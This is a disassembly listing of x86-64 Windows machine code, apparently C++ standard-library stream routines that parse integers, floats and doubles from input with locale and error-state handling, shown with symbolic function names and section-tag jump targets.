mov [ rsp + 0x48 ] 0xfffffffffffffffe
mov r13 rdx
mov rbx rcx
mov [ rsp + 0xd0 ] 0x0
mov [ rsp + 0x70 ] rcx
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
mov rcx [ r8 + rcx + 0x48 ]
test rcx rcx
je r-xdata
xor edx edx
mov rcx rbx
call sub_140006f30
mov [ rsp + 0x78 ] al
test al al
je r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
mov eax [ rsp + 0xd0 ]
test eax eax
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
lea rdx [ rsp + 0x40 ]
call sub_140003240
nop
mov rcx rax
call sub_1400214c0
mov r12 rax
mov rsi [ rsp + 0x40 ]
test rsi rsi
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rbx + 0x48 ]
test rcx rcx
je r-xdata
mov edx [ rcx + 0x10 ]
or edx eax
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rbx ]
movsxd rdx [ rax + 0x4 ]
add rdx rbx
mov [ rsp + 0x50 ] 0x0
mov [ rsp + 0x58 ] 0x1
mov rax [ rdx + 0x48 ]
mov [ rsp + 0x60 ] rax
test rax rax
sete [ rsp + 0x68 ]
movaps xmm0 [ rsp + 0x50 ]
movdqa [ rsp + 0x50 ] xmm0
movaps xmm1 [ rsp + 0x60 ]
movdqa [ rsp + 0x60 ] xmm1
mov rax [ r12 ]
mov [ rsp + 0x30 ] r13
lea rcx [ rsp + 0xd0 ]
mov [ rsp + 0x28 ] rcx
mov [ rsp + 0x20 ] rdx
lea r9 [ rsp + 0x50 ]
lea r8 [ rsp + 0x60 ]
lea rdx [ rsp + 0x80 ]
mov rcx r12
call [ rax + 0x38 ]
nop
jmp r-xdata
xor edx edx
lea rcx [ rsp + 0xd8 ]
call sub_14003825c
mov rax [ rsi + 0x8 ]
test rax rax
je r-xdata
mov rax rbx
add rsp 0x90
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
xor r8d r8d
call sub_140003120
nop
or edx 0x4
xor edi edi
cmp [ rsi + 0x8 ] rdi
cmove rdi rsi
lea rcx [ rsp + 0xd8 ]
call sub_14003828c
test rdi rdi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax [ rdi ]
mov edx 0x1
mov rcx rdi
call [ rax ]
nop
dec rax
mov [ rsi + 0x8 ] rax
sub_14001dc40
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x7 ]
sub rsp 0xc8
mov [ rbp - 0x61 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x9 ] rax
mov [ rsp + 0x40 ] r9
mov r14 r8
mov r15 rdx
mov r12 rcx
mov rsi [ rbp + 0x6f ]
mov r13 [ rbp + 0x77 ]
mov rax [ rbp + 0x7f ]
mov [ rbp - 0x69 ] rax
or rdi 0xffffffffffffffff
mov rcx rsi
test [ rsi + 0x18 ] 0x4000
je r-xdata
xor ebx ebx
mov [ rsp + 0x30 ] ebx
lea rdx [ rbp - 0x79 ]
call sub_140003240
mov r11 rax
mov eax [ rsi + 0x18 ]
mov [ rsp + 0x28 ] r11
mov [ rsp + 0x20 ] eax
mov r9 [ rsp + 0x40 ]
mov r8 r14
lea rdx [ rbp - 0x59 ]
mov rcx r12
call sub_14001ecc0
mov r8d eax
lea r9 [ rsp + 0x30 ]
lea rdx [ rbp - 0x71 ]
lea rcx [ rbp - 0x59 ]
call sub_14003a3a0
mov r12d eax
mov rsi [ rbp - 0x79 ]
test rsi rsi
je r-xdata
lea rdx [ rsp + 0x38 ]
call sub_140003240
nop
mov rcx rax
call sub_14000b210
mov [ rbp - 0x79 ] rax
xor ebx ebx
mov r12 [ rsp + 0x38 ]
test r12 r12
je r-xdata
lea rax [ rbp - 0x59 ]
cmp [ rbp - 0x71 ] rax
je r-xdata
xor edx edx
lea rcx [ rsp + 0x38 ]
call sub_14003825c
mov rax [ rsi + 0x8 ]
test rax rax
je r-xdata
mov [ rbp - 0x41 ] 0x7
mov [ rbp - 0x49 ] 0x1
mov [ rbp - 0x59 ] ebx
lea rdx [ rbp - 0x31 ]
mov r12 [ rbp - 0x79 ]
mov rcx r12
call sub_14000a430
nop
mov r9 rdi
xor r8d r8d
mov rdx rax
lea rcx [ rbp - 0x59 ]
call sub_140007240
nop
cmp [ rbp - 0x19 ] 0x8
jb r-xdata
xor edx edx
lea rcx [ rsp + 0x30 ]
call sub_14003825c
mov rax [ r12 + 0x8 ]
test rax rax
je r-xdata
mov rdx [ rsp + 0x40 ]
mov rcx r14
call sub_1400219d0
test al al
je r-xdata
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
cmp [ rsi + 0x8 ] 0x0
cmove rbx rsi
lea rcx [ rsp + 0x38 ]
call sub_14003828c
test rbx rbx
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax rdi
mov rcx [ rbp - 0x49 ]
sub rax rcx
cmp rax 0x1
ja r-xdata
mov rcx [ rbp - 0x31 ]
call j_sub_14003ad04
mov rsi rbx
cmp [ r12 + 0x8 ] rbx
cmove rsi r12
lea rcx [ rsp + 0x30 ]
call sub_14003828c
test rsi rsi
je r-xdata
cmp rax rdi
jae r-xdata
test edi edi
jns r-xdata
or [ r13 ] 0x1
cmp r12d 0x1
cmovbe edi r12d
mov rax [ rbx ]
mov edx 0x1
mov rcx rbx
call [ rax ]
dec rax
mov [ rsi + 0x8 ] rax
lea rsi [ rcx + 0x1 ]
mov rax 0x7ffffffffffffffe
cmp rsi rax
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rax [ rsi ]
mov edx 0x1
mov rcx rsi
call [ rax ]
dec rax
mov [ r12 + 0x8 ] rax
setne cl
mov rax [ rbp - 0x69 ]
mov [ rax ] cl
or [ r13 ] 0x2
jmp r-xdata
mov rdx [ rbp - 0x41 ]
cmp rdx rsi
jae r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rcx [ r14 ]
mov [ r15 ] rcx
mov rcx [ r14 + 0x8 ]
mov [ r15 + 0x8 ] rcx
mov rax r15
mov rcx [ rbp - 0x9 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0xc8
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
test rsi rsi
jne r-xdata
mov r8 rcx
mov rdx rsi
lea rcx [ rbp - 0x59 ]
call sub_1400025a0
jmp r-xdata
setne al
test al al
je r-xdata
mov [ rbp - 0x49 ] rbx
lea rax [ rbp - 0x59 ]
cmp rdx 0x8
cmovae rax [ rbp - 0x59 ]
mov [ rax ] bx
mov rcx [ rbp - 0x49 ]
mov rdx [ rbp - 0x41 ]
test rsi rsi
lea rdx [ rbp - 0x31 ]
mov rcx r12
call sub_14002aea0
nop
mov r9 rdi
xor r8d r8d
mov rdx rax
lea rcx [ rbp - 0x59 ]
call sub_140007240
nop
cmp [ rbp - 0x19 ] 0x8
jb r-xdata
lea rax [ rbp - 0x59 ]
cmp rdx 0x8
cmovae rax [ rbp - 0x59 ]
mov [ rax + rcx * 2 ] bx
mov [ rbp - 0x49 ] rsi
lea rax [ rbp - 0x59 ]
cmp [ rbp - 0x41 ] 0x8
cmovae rax [ rbp - 0x59 ]
mov [ rax + rsi * 2 ] bx
lea r8 [ rbp - 0x59 ]
mov rsi [ rbp - 0x59 ]
mov rbx [ rbp - 0x41 ]
cmp rbx 0x8
cmovae r8 rsi
mov rdx [ rsp + 0x40 ]
mov rcx r14
call sub_140021610
mov edi eax
cmp rbx 0x8
jb r-xdata
mov rcx [ rbp - 0x31 ]
call j_sub_14003ad04
mov rcx rsi
call j_sub_14003ad04
jmp r-xdata
sub_14001df80
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x88
mov [ rsp + 0x50 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x78 ] rax
mov r15 r9
mov r13 r8
mov r12 rdx
mov rdi rcx
mov rbx [ rsp + 0xf0 ]
mov rsi [ rsp + 0xf8 ]
mov r14 [ rsp + 0x100 ]
xor ebp ebp
mov [ rsp + 0x30 ] ebp
lea rdx [ rsp + 0x40 ]
mov rcx rbx
call sub_140003240
mov r11 rax
mov eax [ rbx + 0x18 ]
mov [ rsp + 0x28 ] r11
mov [ rsp + 0x20 ] eax
mov r9 r15
mov r8 r13
lea rdx [ rsp + 0x58 ]
mov rcx rdi
call sub_14001ecc0
mov [ rsp + 0x38 ] eax
mov rbx [ rsp + 0x40 ]
test rbx rbx
je r-xdata
lea rdi [ rsp + 0x59 ]
lea rax [ rsp + 0x58 ]
cmp [ rsp + 0x58 ] 0x2d
cmovne rdi rax
lea r9 [ rsp + 0x30 ]
mov r8d [ rsp + 0x38 ]
lea rdx [ rsp + 0x48 ]
mov rcx rdi
call sub_14003a3a0
mov ebx eax
mov rdx r15
mov rcx r13
call sub_1400219d0
test al al
je r-xdata
xor edx edx
lea rcx [ rsp + 0x34 ]
call sub_14003825c
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
cmp [ rsp + 0x48 ] rdi
je r-xdata
or [ rsi ] 0x1
cmp [ rbx + 0x8 ] 0x0
cmove rbp rbx
lea rcx [ rsp + 0x34 ]
call sub_14003828c
test rbp rbp
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
or [ rsi ] 0x2
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
mov rax [ rbp ]
mov edx 0x1
mov rcx rbp
call [ rax ]
dec rax
mov [ rbx + 0x8 ] rax
cmp ebx 0xffff
ja r-xdata
cmp [ rsp + 0x58 ] 0x2d
jne r-xdata
mov [ r14 ] bx
jmp r-xdata
neg ebx
mov rcx [ r13 ]
mov [ r12 ] rcx
mov rcx [ r13 + 0x8 ]
mov [ r12 + 0x8 ] rcx
mov rax r12
mov rcx [ rsp + 0x78 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x88
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_14001e100
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x88
mov [ rsp + 0x50 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x78 ] rax
mov r15 r9
mov r13 r8
mov r12 rdx
mov rdi rcx
mov rbx [ rsp + 0xf0 ]
mov rsi [ rsp + 0xf8 ]
mov r14 [ rsp + 0x100 ]
xor ebp ebp
mov [ rsp + 0x30 ] ebp
lea rdx [ rsp + 0x40 ]
mov rcx rbx
call sub_140003240
mov r11 rax
mov eax [ rbx + 0x18 ]
mov [ rsp + 0x28 ] r11
mov [ rsp + 0x20 ] eax
mov r9 r15
mov r8 r13
lea rdx [ rsp + 0x58 ]
mov rcx rdi
call sub_14001ecc0
mov [ rsp + 0x38 ] eax
mov rbx [ rsp + 0x40 ]
test rbx rbx
je r-xdata
lea rdi [ rsp + 0x59 ]
lea rax [ rsp + 0x58 ]
cmp [ rsp + 0x58 ] 0x2d
cmovne rdi rax
lea r9 [ rsp + 0x30 ]
mov r8d [ rsp + 0x38 ]
lea rdx [ rsp + 0x48 ]
mov rcx rdi
call sub_14003a3a0
mov ebx eax
mov rdx r15
mov rcx r13
call sub_1400219d0
test al al
je r-xdata
xor edx edx
lea rcx [ rsp + 0x34 ]
call sub_14003825c
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
cmp [ rsp + 0x48 ] rdi
je r-xdata
or [ rsi ] 0x1
cmp [ rbx + 0x8 ] 0x0
cmove rbp rbx
lea rcx [ rsp + 0x34 ]
call sub_14003828c
test rbp rbp
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
or [ rsi ] 0x2
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
mov rax [ rbp ]
mov edx 0x1
mov rcx rbp
call [ rax ]
dec rax
mov [ rbx + 0x8 ] rax
cmp ebx 0xffffffff
ja r-xdata
cmp [ rsp + 0x58 ] 0x2d
jne r-xdata
mov [ r14 ] ebx
jmp r-xdata
neg ebx
mov rcx [ r13 ]
mov [ r12 ] rcx
mov rcx [ r13 + 0x8 ]
mov [ r12 + 0x8 ] rcx
mov rax r12
mov rcx [ rsp + 0x78 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x88
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_14001e280
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x88
mov [ rsp + 0x48 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
mov r15 r9
mov r13 r8
mov r12 rdx
mov rdi rcx
mov rbx [ rsp + 0xf0 ]
mov rsi [ rsp + 0xf8 ]
mov r14 [ rsp + 0x100 ]
xor ebp ebp
mov [ rsp + 0x30 ] ebp
lea rdx [ rsp + 0x38 ]
mov rcx rbx
call sub_140003240
mov r11 rax
mov eax [ rbx + 0x18 ]
mov [ rsp + 0x28 ] r11
mov [ rsp + 0x20 ] eax
mov r9 r15
mov r8 r13
lea rdx [ rsp + 0x50 ]
mov rcx rdi
call sub_14001ecc0
mov r8d eax
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x50 ]
call sub_140039fc4
mov edi eax
mov rbx [ rsp + 0x38 ]
test rbx rbx
je r-xdata
mov rdx r15
mov rcx r13
call sub_1400219d0
test al al
je r-xdata
xor edx edx
lea rcx [ rsp + 0x34 ]
call sub_14003825c
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
lea rax [ rsp + 0x50 ]
cmp [ rsp + 0x40 ] rax
je r-xdata
or [ rsi ] 0x1
cmp [ rbx + 0x8 ] 0x0
cmove rbp rbx
lea rcx [ rsp + 0x34 ]
call sub_14003828c
test rbp rbp
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
or [ rsi ] 0x2
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
mov rax [ rbp ]
mov edx 0x1
mov rcx rbp
call [ rax ]
dec rax
mov [ rbx + 0x8 ] rax
mov [ r14 ] edi
jmp r-xdata
mov rcx [ r13 ]
mov [ r12 ] rcx
mov rcx [ r13 + 0x8 ]
mov [ r12 + 0x8 ] rcx
mov rax r12
mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x88
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_14001e3e0
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x88
mov [ rsp + 0x48 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
mov r15 r9
mov r13 r8
mov r12 rdx
mov rdi rcx
mov rbx [ rsp + 0xf0 ]
mov rsi [ rsp + 0xf8 ]
mov r14 [ rsp + 0x100 ]
xor ebp ebp
mov [ rsp + 0x30 ] ebp
lea rdx [ rsp + 0x38 ]
mov rcx rbx
call sub_140003240
mov r11 rax
mov eax [ rbx + 0x18 ]
mov [ rsp + 0x28 ] r11
mov [ rsp + 0x20 ] eax
mov r9 r15
mov r8 r13
lea rdx [ rsp + 0x50 ]
mov rcx rdi
call sub_14001ecc0
mov r8d eax
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x50 ]
call sub_14003a3a0
mov edi eax
mov rbx [ rsp + 0x38 ]
test rbx rbx
je r-xdata
mov rdx r15
mov rcx r13
call sub_1400219d0
test al al
je r-xdata
xor edx edx
lea rcx [ rsp + 0x34 ]
call sub_14003825c
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
lea rax [ rsp + 0x50 ]
cmp [ rsp + 0x40 ] rax
je r-xdata
or [ rsi ] 0x1
cmp [ rbx + 0x8 ] 0x0
cmove rbp rbx
lea rcx [ rsp + 0x34 ]
call sub_14003828c
test rbp rbp
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
or [ rsi ] 0x2
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
mov rax [ rbp ]
mov edx 0x1
mov rcx rbp
call [ rax ]
dec rax
mov [ rbx + 0x8 ] rax
mov [ r14 ] edi
jmp r-xdata
mov rcx [ r13 ]
mov [ r12 ] rcx
mov rcx [ r13 + 0x8 ]
mov [ r12 + 0x8 ] rcx
mov rax r12
mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x88
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_14001e540
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x88
mov [ rsp + 0x48 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
mov r15 r9
mov r13 r8
mov r12 rdx
mov rdi rcx
mov rbx [ rsp + 0xf0 ]
mov rsi [ rsp + 0xf8 ]
mov r14 [ rsp + 0x100 ]
xor ebp ebp
mov [ rsp + 0x30 ] ebp
lea rdx [ rsp + 0x38 ]
mov rcx rbx
call sub_140003240
mov r11 rax
mov eax [ rbx + 0x18 ]
mov [ rsp + 0x28 ] r11
mov [ rsp + 0x20 ] eax
mov r9 r15
mov r8 r13
lea rdx [ rsp + 0x50 ]
mov rcx rdi
call sub_14001ecc0
mov r8d eax
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x50 ]
call sub_14003a0b8
mov rdi rax
mov rbx [ rsp + 0x38 ]
test rbx rbx
je r-xdata
mov rdx r15
mov rcx r13
call sub_1400219d0
test al al
je r-xdata
xor edx edx
lea rcx [ rsp + 0x34 ]
call sub_14003825c
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
lea rax [ rsp + 0x50 ]
cmp [ rsp + 0x40 ] rax
je r-xdata
or [ rsi ] 0x1
cmp [ rbx + 0x8 ] 0x0
cmove rbp rbx
lea rcx [ rsp + 0x34 ]
call sub_14003828c
test rbp rbp
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
or [ rsi ] 0x2
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
mov rax [ rbp ]
mov edx 0x1
mov rcx rbp
call [ rax ]
dec rax
mov [ rbx + 0x8 ] rax
mov [ r14 ] rdi
jmp r-xdata
mov rcx [ r13 ]
mov [ r12 ] rcx
mov rcx [ r13 + 0x8 ]
mov [ r12 + 0x8 ] rcx
mov rax r12
mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x88
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_14001e6a0
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x88
mov [ rsp + 0x48 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
mov r15 r9
mov r13 r8
mov r12 rdx
mov rdi rcx
mov rbx [ rsp + 0xf0 ]
mov rsi [ rsp + 0xf8 ]
mov r14 [ rsp + 0x100 ]
xor ebp ebp
mov [ rsp + 0x30 ] ebp
lea rdx [ rsp + 0x38 ]
mov rcx rbx
call sub_140003240
mov r11 rax
mov eax [ rbx + 0x18 ]
mov [ rsp + 0x28 ] r11
mov [ rsp + 0x20 ] eax
mov r9 r15
mov r8 r13
lea rdx [ rsp + 0x50 ]
mov rcx rdi
call sub_14001ecc0
mov r8d eax
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x50 ]
call sub_14003a1ac
mov rdi rax
mov rbx [ rsp + 0x38 ]
test rbx rbx
je r-xdata
mov rdx r15
mov rcx r13
call sub_1400219d0
test al al
je r-xdata
xor edx edx
lea rcx [ rsp + 0x34 ]
call sub_14003825c
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
lea rax [ rsp + 0x50 ]
cmp [ rsp + 0x40 ] rax
je r-xdata
or [ rsi ] 0x1
cmp [ rbx + 0x8 ] 0x0
cmove rbp rbx
lea rcx [ rsp + 0x34 ]
call sub_14003828c
test rbp rbp
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
or [ rsi ] 0x2
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
mov rax [ rbp ]
mov edx 0x1
mov rcx rbp
call [ rax ]
dec rax
mov [ rbx + 0x8 ] rax
mov [ r14 ] rdi
jmp r-xdata
mov rcx [ r13 ]
mov [ r12 ] rcx
mov rcx [ r13 + 0x8 ]
mov [ r12 + 0x8 ] rcx
mov rax r12
mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x88
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_14001e800
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0xa0
movaps [ rsp + 0x90 ] xmm6
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x80 ] rax
mov rax [ rsp + 0xf0 ]
mov rbx [ rsp + 0xf8 ]
mov rbp [ rsp + 0x100 ]
mov rdi rdx
xor edx edx
mov r12 r9
mov [ rsp + 0x30 ] edx
mov [ rsp + 0x34 ] edx
lea rdx [ rsp + 0x34 ]
mov [ rsp + 0x28 ] rdx
lea rdx [ rsp + 0x40 ]
mov rsi r8
mov [ rsp + 0x20 ] rax
call sub_14001f2e0
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0x38 ]
lea rcx [ rsp + 0x40 ]
mov r8d eax
call sub_14003a0a4
mov edx [ rsp + 0x34 ]
movaps xmm6 xmm0
test edx edx
je r-xdata
mov rdx r12
mov rcx rsi
call sub_1400219d0
test al al
je r-xdata
unpcklps xmm6 xmm6
shl edx 0x2
cvtps2pd xmm0 xmm6
call sub_14003d028
cvtsd2ss xmm6 xmm0
lea rax [ rsp + 0x40 ]
cmp [ rsp + 0x38 ] rax
je r-xdata
or [ rbx ] 0x1
or [ rbx ] 0x2
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
movss [ rbp ] xmm6
jmp r-xdata
mov rcx [ rsi ]
mov rax rdi
mov [ rdi ] rcx
mov rcx [ rsi + 0x8 ]
mov [ rdi + 0x8 ] rcx
mov rcx [ rsp + 0x80 ]
xor rcx rsp
call sub_14003a6a0
movaps xmm6 [ rsp + 0x90 ]
add rsp 0xa0
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_14001e910
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0xa0
movaps [ rsp + 0x90 ] xmm6
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x80 ] rax
mov rax [ rsp + 0xf0 ]
mov rbx [ rsp + 0xf8 ]
mov rbp [ rsp + 0x100 ]
mov rdi rdx
xor edx edx
mov r12 r9
mov [ rsp + 0x30 ] edx
mov [ rsp + 0x34 ] edx
lea rdx [ rsp + 0x34 ]
mov [ rsp + 0x28 ] rdx
lea rdx [ rsp + 0x40 ]
mov rsi r8
mov [ rsp + 0x20 ] rax
call sub_14001f2e0
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0x38 ]
lea rcx [ rsp + 0x40 ]
mov r8d eax
call sub_14003a580
mov edx [ rsp + 0x34 ]
movapd xmm6 xmm0
test edx edx
je r-xdata
mov rdx r12
mov rcx rsi
call sub_1400219d0
test al al
je r-xdata
shl edx 0x2
call sub_14003d028
movapd xmm6 xmm0
lea rax [ rsp + 0x40 ]
cmp [ rsp + 0x38 ] rax
je r-xdata
or [ rbx ] 0x1
or [ rbx ] 0x2
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
movsd [ rbp ] xmm6
jmp r-xdata
mov rcx [ rsi ]
mov rax rdi
mov [ rdi ] rcx
mov rcx [ rsi + 0x8 ]
mov [ rdi + 0x8 ] rcx
mov rcx [ rsp + 0x80 ]
xor rcx rsp
call sub_14003a6a0
movaps xmm6 [ rsp + 0x90 ]
add rsp 0xa0
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_14001ea20
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0xa0
movaps [ rsp + 0x90 ] xmm6
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x80 ] rax
mov rax [ rsp + 0xf0 ]
mov rbx [ rsp + 0xf8 ]
mov rbp [ rsp + 0x100 ]
mov rdi rdx
xor edx edx
mov r12 r9
mov [ rsp + 0x30 ] edx
mov [ rsp + 0x34 ] edx
lea rdx [ rsp + 0x34 ]
mov [ rsp + 0x28 ] rdx
lea rdx [ rsp + 0x40 ]
mov rsi r8
mov [ rsp + 0x20 ] rax
call sub_14001f2e0
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0x38 ]
lea rcx [ rsp + 0x40 ]
mov r8d eax
call j_sub_14003a580
mov edx [ rsp + 0x34 ]
movapd xmm6 xmm0
test edx edx
je r-xdata
mov rdx r12
mov rcx rsi
call sub_1400219d0
test al al
je r-xdata
shl edx 0x2
call sub_14003d028
movapd xmm6 xmm0
lea rax [ rsp + 0x40 ]
cmp [ rsp + 0x38 ] rax
je r-xdata
or [ rbx ] 0x1
or [ rbx ] 0x2
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
movsd [ rbp ] xmm6
jmp r-xdata
mov rcx [ rsi ]
mov rax rdi
mov [ rdi ] rcx
mov rcx [ rsi + 0x8 ]
mov [ rdi + 0x8 ] rcx
mov rcx [ rsp + 0x80 ]
xor rcx rsp
call sub_14003a6a0
movaps xmm6 [ rsp + 0x90 ]
add rsp 0xa0
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_14001eb30
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x88
mov [ rsp + 0x48 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
mov r14 r9
mov r12 r8
mov rbp rdx
mov rbx rcx
mov rcx [ rsp + 0xf0 ]
mov rdi [ rsp + 0xf8 ]
mov r13 [ rsp + 0x100 ]
xor esi esi
mov [ rsp + 0x30 ] esi
lea rdx [ rsp + 0x38 ]
call sub_140003240
nop
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] 0x800
mov r9 r14
mov r8 r12
lea rdx [ rsp + 0x50 ]
mov rcx rbx
call sub_14001ecc0
mov r15d eax
mov rbx [ rsp + 0x38 ]
test rbx rbx
je r-xdata
lea r9 [ rsp + 0x30 ]
mov r8d r15d
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x50 ]
call sub_14003a1ac
mov rbx rax
mov rdx r14
mov rcx r12
call sub_1400219d0
test al al
je r-xdata
xor edx edx
lea rcx [ rsp + 0x34 ]
call sub_14003825c
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
lea rax [ rsp + 0x50 ]
cmp [ rsp + 0x40 ] rax
je r-xdata
or [ rdi ] 0x1
cmp [ rbx + 0x8 ] 0x0
cmove rsi rbx
lea rcx [ rsp + 0x34 ]
call sub_14003828c
test rsi rsi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
or [ rdi ] 0x2
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
mov rax [ rsi ]
mov edx 0x1
mov rcx rsi
call [ rax ]
dec rax
mov [ rbx + 0x8 ] rax
mov [ r13 ] rbx
jmp r-xdata
mov rcx [ r12 ]
mov [ rbp ] rcx
mov rcx [ r12 + 0x8 ]
mov [ rbp + 0x8 ] rcx
mov rax rbp
mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x88
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_14001ecc0
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0xf ]
sub rsp 0xd8
mov [ rbp - 0x59 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x1 ] rax
mov r13 r9
mov [ rbp - 0x61 ] r9
mov rdi r8
mov r12 rdx
mov [ rbp - 0x79 ] rdx
mov rsi rcx
mov rcx [ rbp + 0x7f ]
call sub_14000b210
mov rbx rax
lea rdx [ rbp - 0x29 ]
mov rcx rax
call sub_14002b150
nop
xor r14d r14d
cmp [ rbp - 0x19 ] r14
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x10 ]
mov [ rbp - 0x7d ] ax
mov [ rbp - 0x7d ] r14w
jmp r-xdata
mov eax [ rbp + 0x77 ]
and eax 0xe00
mov ecx 0x8
cmp eax 0x400
jne r-xdata
mov [ rsp + 0x30 ] 0x2b
xor eax eax
mov [ rsp + 0x3c ] ax
mov [ rsp + 0x44 ] eax
mov [ rsp + 0x20 ] rsi
lea r9 [ rsp + 0x44 ]
mov r8d r15d
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x3c ]
call sub_1400385a4
movzx ebx [ rsp + 0x3c ]
mov rcx rdi
call sub_1400212e0
cmp ax bx
jne r-xdata
mov [ rsp + 0x30 ] 0x30
mov [ rsp + 0x40 ] r14w
mov [ rsp + 0x44 ] r14d
add rsi 0x10
mov [ rbp - 0x69 ] rsi
mov [ rsp + 0x20 ] rsi
lea r9 [ rsp + 0x44 ]
mov r15d 0x1
mov r8d r15d
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x40 ]
call sub_1400385a4
mov r14 r12
mov rdx r13
